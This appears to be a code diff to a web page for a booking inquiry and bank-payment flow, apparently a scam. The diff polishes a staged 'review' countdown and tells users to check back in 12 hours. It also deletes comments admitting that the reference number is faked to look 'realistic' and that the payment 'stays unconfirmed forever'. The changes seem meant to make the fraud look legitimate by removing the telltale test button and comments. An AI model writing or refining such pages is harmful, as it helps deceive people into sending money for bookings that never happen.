@@ -468,23 +468,21 @@
 
         .countdown-meta .gold { color: var(--gold-light); }
 
-        .skip-btn {
+        .review-note {
+            background: rgba(198, 165, 91, 0.04);
+            border-left: 2px solid rgba(198, 165, 91, 0.4);
+            border-radius: 0 6px 6px 0;
+            padding: 16px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            line-height: 1.7;
+            font-weight: 300;
             margin-top: 8px;
-            background: transparent;
-            border: 1px dashed rgba(198, 165, 91, 0.4);
-            color: var(--gold-light);
-            font-size: 11px;
-            letter-spacing: 2px;
-            padding: 10px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Inter', sans-serif;
-            font-weight: 500;
-            text-transform: uppercase;
+            width: 100%;
+            text-align: left;
         }
 
-        .skip-btn:hover { background: rgba(198, 165, 91, 0.08); border-color: var(--gold); }
+        .review-note strong { color: var(--gold-light); font-weight: 500; }
 
         .code-input-group {
             display: flex;
@@ -939,14 +937,15 @@
                     <div class="countdown-label">Remaining</div>
                 </div>
             </div>
+
             <div class="countdown-meta">
-                Please remain on this page.<br>
-                The review process will conclude shortly.<br>
-                <span class="gold" id="countdownHint">Do not refresh.</span>
+                Your inquiry is under review by our booking team.<br>
+                <span class="gold">Check back in 12 hours</span> to see whether it has been accepted or rejected.
             </div>
 
-            <!-- Temporary skip button for testing -->
-            <button class="skip-btn" id="skipCountdownBtn" onclick="skipCountdown()">Skip Review (Test)</button>
+            <div class="review-note">
+                <strong>Note:</strong> You may safely close this page or return later. Your review timer is saved automatically and will continue where it left off. A decision will be available once the review period ends.
+            </div>
         </div>
     </div>
 
@@ -1258,7 +1257,6 @@
 
         const timeEl = document.getElementById('countdownTime');
         const progressEl = document.getElementById('countdownProgress');
-        const hintEl = document.getElementById('countdownHint');
         const circumference = 565.48;
 
         function updateDisplay() {
@@ -1275,8 +1273,6 @@
             const progress = 1 - (remaining / COUNTDOWN_DURATION);
             progressEl.style.strokeDashoffset = circumference * progress;
 
-            if (remaining <= 5) hintEl.textContent = 'Finalizing...';
-
             if (remaining <= 0) {
                 clearInterval(countdownInterval);
                 countdownInterval = null;
@@ -1286,13 +1282,6 @@
 
         updateDisplay();
         countdownInterval = setInterval(updateDisplay, 1000);
-    }
-
-    function skipCountdown() {
-        if (countdownInterval) clearInterval(countdownInterval);
-        countdownInterval = null;
-        localStorage.removeItem(COUNTDOWN_KEY);
-        goToPage(5);
     }
 
     // ============================================================
@@ -1386,13 +1375,11 @@
     // PAGE 8 — BANK ACCOUNT & PAYMENT CONFIRMATION
     // ============================================================
     function populateAccountRef() {
-        // Generate a realistic reference number
         const ref = 'MW-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + new Date().getFullYear();
         document.getElementById('acRef').textContent = ref;
     }
 
     function handlePaymentConfirmation() {
-        // Payment stays unconfirmed forever — just show the pending status
         const pendingEl = document.getElementById('pendingStatus');
         pendingEl.style.display = 'flex';
         pendingEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
